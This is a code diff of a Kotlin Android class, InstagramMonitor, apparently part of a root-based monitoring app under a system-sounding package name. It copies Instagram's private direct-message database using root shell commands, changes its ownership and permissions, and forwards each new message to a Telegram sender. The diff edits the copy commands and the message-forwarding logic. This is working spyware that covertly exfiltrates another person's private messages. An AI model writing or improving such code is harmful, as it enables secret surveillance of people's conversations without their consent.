@@ -5,9 +5,9 @@ import android.database.sqlite.SQLiteDatabase
 import com.system.superiormonitor.bot.OfflineManager
 import com.system.superiormonitor.bot.TelegramApi
 import com.system.superiormonitor.data.PrefsManager
-import com.system.superiormonitor.util.LogCategory
-import com.system.superiormonitor.util.LogLevel
-import com.system.superiormonitor.util.LogManager
+import com.system.superiormonitor.core.LogCategory
+import com.system.superiormonitor.core.LogLevel
+import com.system.superiormonitor.core.LogManager
 import com.topjohnwu.superuser.Shell
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.Flow
@@ -111,8 +111,7 @@ class InstagramMonitor(
     }
 
     private val workDir: File by lazy {
-        val dir = context.getExternalFilesDir("instagram/watchdir")
-            ?: File(context.cacheDir, "instagram/watchdir")
+        val dir = File(context.filesDir, "instagram/watchdir")
         dir.also { if (!it.exists()) it.mkdirs() }
     }
 
@@ -146,22 +145,16 @@ class InstagramMonitor(
 
                 if (currentMaxId > 0 && prefsManager.instagramLastProcessedId > currentMaxId) {
                     LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Database wipe detected (Stored TS: ${prefsManager.instagramLastProcessedId}, Current Max TS: $currentMaxId). Resetting baseline.")
-                    prefsManager.instagramLastProcessedId = currentMaxId
                 }
 
-                if (prefsManager.instagramLastProcessedId == 0L) {
-                    prefsManager.instagramLastProcessedId = currentMaxId
-                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Baseline established (TS: ${prefsManager.instagramLastProcessedId}). Watching for live messages...")
-                } else {
-                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Resuming from TS: ${prefsManager.instagramLastProcessedId}. Performing catch-up sync...")
-                    processNewMessages(isCatchUp = true)
-                }
+                prefsManager.instagramLastProcessedId = currentMaxId
+                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Baseline established (TS: ${prefsManager.instagramLastProcessedId}). Watching for live messages...")
 
                 createWatcherFlow()
                     .debounce(DEBOUNCE_MS)
                     .collect {
                         try {
-                            processNewMessages(isCatchUp = false)
+                            processNewMessages()
                         } catch (e: CancellationException) {
                             throw e
                         } catch (e: Exception) {
@@ -216,11 +209,14 @@ class InstagramMonitor(
 
     private fun syncDatabase() {
         val destPath = workDir.absolutePath
+        val uid = android.os.Process.myUid()
         val result = Shell.cmd(
+            "rm -f $destPath/direct.db*",
             "cp $igDbDir/direct.db $destPath/direct.db",
             "cp $igDbDir/direct.db-journal $destPath/direct.db-journal 2>/dev/null || true",
             "cp $igDbDir/direct.db-shm $destPath/direct.db-shm 2>/dev/null || true",
             "cp $igDbDir/direct.db-wal $destPath/direct.db-wal 2>/dev/null || true",
+            "chown $uid:$uid $destPath/direct.db*",
             "chmod 666 $destPath/direct.db $destPath/direct.db-journal $destPath/direct.db-shm $destPath/direct.db-wal 2>/dev/null || true"
         ).exec()
 
@@ -254,7 +250,7 @@ class InstagramMonitor(
         }
     }
 
-    private suspend fun processNewMessages(isCatchUp: Boolean = false) {
+    private suspend fun processNewMessages() {
         Thread.sleep(150)
         syncDatabase()
 
@@ -279,31 +275,19 @@ class InstagramMonitor(
                     if (!processedIds.contains(row.id) && row.tsMicros > prefsManager.instagramLastProcessedId) {
                         processedIds.add(row.id)
                         val formatted = formatOutputMessage(row)
-                        if (isCatchUp) {
-                            OfflineManager.queueOnly(
-                                context = context,
-                                message = formatted,
-                                offlineSubdir = "instagram",
-                                offlineFileName = "offline_instagram.txt"
-                            )
-                        } else {
-                            OfflineManager.sendOrQueue(
-                                context = context,
-                                message = formatted,
-                                offlineSubdir = "instagram",
-                                offlineFileName = "offline_instagram.txt",
-                                sender = sendTelegram
-                            )
-                        }
+                        OfflineManager.sendOrQueue(
+                            context = context,
+                            message = formatted,
+                            offlineSubdir = "instagram",
+                            offlineFileName = "offline_instagram.txt",
+                            sender = sendTelegram
+                        )
                         prefsManager.instagramLastProcessedId = row.tsMicros
                     }
                 }
 
                 if (processedIds.isNotEmpty()) {
                     LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Forwarded/Queued ${processedIds.size} new message(s).")
-                    if (isCatchUp && com.system.superiormonitor.util.LogManager.isTelegramApiReachable.value) {
-                        OfflineManager.processOfflineQueue(context, CoroutineScope(Dispatchers.IO))
-                    }
                 }
             }
         } catch (e: Exception) {
